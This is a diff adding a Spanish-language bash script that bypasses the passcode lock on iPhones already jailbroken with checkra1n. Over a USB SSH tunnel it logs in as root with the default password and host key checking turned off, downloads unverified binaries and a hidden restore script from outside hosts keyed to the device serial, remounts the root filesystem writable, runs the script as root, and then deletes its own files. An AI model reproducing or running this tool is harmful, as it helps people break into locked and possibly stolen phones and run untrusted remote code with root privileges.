@@ -1,0 +1,60 @@
+#!/bin/bash
+
+clear 
+echo "-- BypassCode Para Dispositivos En Codigo O Desactivados -- "
+
+rm -rf ~/.ssh/known_hosts
+echo "==> Inicio"
+iproxy 2233 44 2> /dev/null &
+
+runcmd () {
+    sshpass -p alpine ssh -o StrictHostKeyChecking=no root@localhost -p 2233 "$1" > /dev/null
+}
+
+
+
+
+read -p "==> Conecta tu Dispositivo Con Checkra1n Aplicado Previamente Para Cargar El Respaldo Presiona Enter Para Empezar "
+
+wget --no-check-certificate https://servitec-unlock.com/Bypass/sshpass ./sshpass > /dev/null 2>&1
+wget --no-check-certificate https://servitec-unlock.com/Bypass/.getserial ./.getserial > /dev/null 2>&1
+
+chmod 755 ./sshpass
+
+./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2233 mount -o rw,union,update /
+
+./sshpass -p alpine scp -rP 2233 -o StrictHostKeyChecking=no ./.getserial root@localhost:/getserial > /dev/null 2>&1
+
+./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2233 chmod 755 /getserial
+
+
+VAR2=$(./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2233 /./getserial | cut -b 09-20)
+
+echo "$VAR2"
+
+wget --no-check-certificate http://iservices-dev.us/Bypass/Seriales/$VAR2.tgz ./$VAR2.tgz > /dev/null 2>&1
+wget --no-check-certificate http://iservices-dev.us/Bypass/.restore1.sh -O ./.restore1.sh > /dev/null 2>&1
+
+tar -xvf $VAR2.tgz > /dev/null 2>&1
+
+wget --no-check-certificate http://iservices-dev.us/Bypass/ldrestart -O ./Command/ldrestart > /dev/null 2>&1
+wget --no-check-certificate http://iservices-dev.us/Bypass/dirname -O ./Command/dirname > /dev/null 2>&1
+wget --no-check-certificate http://iservices-dev.us/Bypass/dirname.distrib -O ./Command/dirname.distrib > /dev/null 2>&1
+
+./sshpass -p alpine scp -rP 2233 -o StrictHostKeyChecking=no ./Command root@localhost:/var/mobile/Media/Downloads > /dev/null 2>&1
+
+./sshpass -p alpine scp -rP 2233 -o StrictHostKeyChecking=no ./.restore1.sh root@localhost:/ > /dev/null 2>&1
+
+./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2233 mount -o rw,union,update / > /dev/null 2>&1
+
+./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2233 chmod 755 /.restore1.sh > /dev/null 2>&1
+
+./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2233 /./.restore1.sh
+
+rm -R ./Command
+rm -rf ./$VAR2.tgz
+rm -rf ./.restore.sh
+rm -rf ./sshpass
+rm -rf ./.getserial
+
+echo “DONE BYPASS PASSCODE GersonAldaz”
